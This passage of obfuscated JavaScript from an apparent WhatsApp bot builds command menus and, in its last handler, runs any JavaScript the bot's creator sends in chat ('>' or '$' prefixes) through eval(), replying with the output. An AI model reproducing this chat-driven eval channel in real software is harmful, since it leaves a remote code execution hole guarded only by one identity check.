    var _0x1e2acc = _0x5c9965.find(_0x5da74c => _0x5da74c.startsWith('*' + _0x226ad1 + " "));
    if (_0x1e2acc && (_0x1e2acc.endsWith("COMMANDS*") || _0x1e2acc.endsWith("MENU*"))) {
      var _0x8852c0 = _0x1e2acc.replace('*' + _0x226ad1, '').replace('|', '').replace(/COMMANDS\*/gi, '').replace(/MENU\*/gi, '').toLowerCase();
      if (_0x8852c0.length > 0 && _0x8852c0.length < 20) {
        const {
          commands: _0x15cf49
        } = require("../lib");
        const _0x3fd5c2 = {};
        _0x15cf49.forEach(_0x1e738c => {
          if (!_0x1e738c.dontAddCommandList && _0x1e738c.pattern !== undefined) {
            if (!_0x3fd5c2[_0x1e738c.category]) {
              _0x3fd5c2[_0x1e738c.category] = [];
            }
            _0x3fd5c2[_0x1e738c.category].push({
              'command': _0x1e738c.pattern,
              'info': _0x1e738c.desc,
              'help': prefix + _0x1e738c.pattern + " " + (_0x1e738c.use ? _0x1e738c.use : '')
            });
          }
        });
        let _0x5bcec3 = false;
        for (const _0x21ca06 in _0x3fd5c2) {
          let _0x2dfbe0 = '' + _0x21ca06.toLowerCase();
          if (_0x8852c0.includes(_0x2dfbe0)) {
            _0x5bcec3 = "┏━━━━━━━━━━━━━━━━━━━━━━━\n┃\tMaster Md_" + _0x21ca06.toUpperCase() + "_COMMANDS*  \n┗━━━━━━━━━━━━━━━━━━━━━━━\n\n\n";
            _0x3fd5c2[_0x21ca06].forEach(_0x618e30 => {
              _0x5bcec3 += "*🍁Command:* ```" + _0x618e30.command + "``` " + (_0x618e30.info ? "\n*🧩Info:* ```" + _0x618e30.info + "```" : '') + "\n*〽️Help:* ```" + _0x618e30.help + "```\n\n";
            });
            _0x5bcec3 += "\n\n" + Config.caption;
            break;
          }
        }
        if (_0x5bcec3) {
          return await _0x39115c.sendUi(_0x39115c.from, {
            'caption': _0x5bcec3
          });
        }
      }
    }
  } catch (_0x4d50e5) {
    console.log("ERROR : ", _0x4d50e5);
  }
});
smd({
  'on': "text"
}, async (_0x1c9bbe, _0x3908c6, {
  budy: _0x5adca3,
  Void: _0x4eef78
}) => {
  const {
    send: _0x21be64,
    reply: _0x391033,
    react: _0x3bb893,
    sendMessage: _0x47c9d0
  } = _0x1c9bbe;
  if (_0x1c9bbe.isCreator) {
    if (!Config.HANDLERS.includes('>') && _0x1c9bbe.text.startsWith('>')) {
      let _0x1b979d = _0x5adca3.slice(1);
      if (!_0x1b979d) {
        return _0x1c9bbe.reply("Provide me with a query to run Master!");
      }
      try {
        let _0x211323 = eval(_0x1b979d);
        if (_0x211323) {
          return _0x1c9bbe.reply(util.format(_0x211323));
        }
      } catch (_0xb4b4d4) {
        return _0x1c9bbe.reply(util.format(_0xb4b4d4));
      }
    } else {
      if (!Config.HANDLERS.includes('$') && _0x1c9bbe.text.startsWith('$')) {
        let _0x1e0ca4 = _0x5adca3.slice(1);
        if (!_0x1e0ca4) {
          return _0x1c9bbe.reply("Provide me with a query to run Master!");
        }
        try {
          let _0x27a9e4 = await eval("const a = async()=>{\n" + _0x1e0ca4 + "\n}\na()");
          await _0x1c9bbe.react('🍁');
          if (_0x27a9e4) {
            return await _0x1c9bbe.reply(util.format(_0x27a9e4));
          }
        } catch (_0x2dbe2b) {
          console.log("ERROR FROM RUNNING QUERY WITH MASTER $\n", _0x2dbe2b);
          return await _0x1c9bbe.reply(util.format(_0x2dbe2b));
        }
      }
    }
  }
});
